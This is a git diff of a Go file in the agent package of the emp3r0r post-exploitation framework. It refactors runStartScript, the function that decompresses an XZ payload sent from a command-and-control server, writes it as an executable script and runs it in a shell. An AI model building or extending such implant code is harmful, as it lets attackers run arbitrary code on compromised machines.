@@ -1,19 +1,17 @@
 package agent
 
 import (
-	"bytes"
 	"fmt"
-	"io"
 	"log"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"runtime"
 
+	"github.com/jm33-m0/arc"
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
-	"github.com/mholt/archives"
 )
 
 // moduleHandler downloads and runs modules from C2
@@ -111,7 +109,7 @@ func runStartScript(startScript, modDir string) (string, error) {
 	}
 
 	// Decompress the payload using XZ
-	decompressedPayload, err := decompressXZ(payload, startScript)
+	decompressedPayload, err := arc.DecompressXz(payload)
 	if err != nil {
 		return "", err
 	}
@@ -132,8 +130,8 @@ func runStartScript(startScript, modDir string) (string, error) {
 	}
 	scriptPath := filepath.Join(modDir, startScript)
 	// write script to file
-	if err := os.WriteFile(scriptPath, decompressedPayload, 0o700); err != nil {
-		return "", fmt.Errorf("writing %s: %v", startScript, err)
+	if writeErr := os.WriteFile(scriptPath, decompressedPayload, 0o700); writeErr != nil {
+		return "", fmt.Errorf("writing %s: %v", startScript, writeErr)
 	}
 	cmd := exec.Command(emp3r0r_data.DefaultShell, scriptPath)
 	out, err := cmd.CombinedOutput()
@@ -142,23 +140,4 @@ func runStartScript(startScript, modDir string) (string, error) {
 		return string(out), err
 	}
 	return string(out), nil
-}
-
-// decompressXZ handles decompression of a payload.
-func decompressXZ(payload []byte, source string) ([]byte, error) {
-	r := bytes.NewReader(payload)
-
-	// Wrap the reader with XZ decompressor
-	decompressor, err := archives.Xz{}.OpenReader(r)
-	if err != nil {
-		return nil, fmt.Errorf("decompressing %s: %w", source, err)
-	}
-	defer decompressor.Close()
-
-	// Read all decompressed data
-	decompressedPayload, err := io.ReadAll(decompressor)
-	if err != nil {
-		return nil, fmt.Errorf("reading decompressed %s: %w", source, err)
-	}
-	return decompressedPayload, nil
 }
